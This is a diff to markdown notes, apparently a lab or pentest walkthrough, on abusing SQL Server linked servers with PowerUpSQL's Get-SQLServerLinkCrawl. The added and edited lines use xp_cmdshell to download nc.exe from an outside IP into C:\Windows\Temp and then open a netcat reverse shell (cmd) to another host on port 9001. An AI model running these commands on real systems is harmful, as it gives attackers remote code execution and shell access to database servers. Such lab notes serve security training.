@@ -142,12 +142,16 @@ Get-SQLServerLink -Instance devsrv.garrison.castle.local
 Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Verbose
 ```
 
-__Reverse Shell__
+__Download nc__
 ```powershell
 Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query
-`exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile('http://172.16.99.11/nc.exe',"C:\Windows\Temp\nc.exe")"`
+`exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile('http://172.16.99.11/nc.exe','C:\Windows\Temp\nc.exe')"`
 ```
 
+__Reverse Shell__
+```powershell
+Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query `exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd 172.16.10.1 9001"`
+```
 
 
 ---
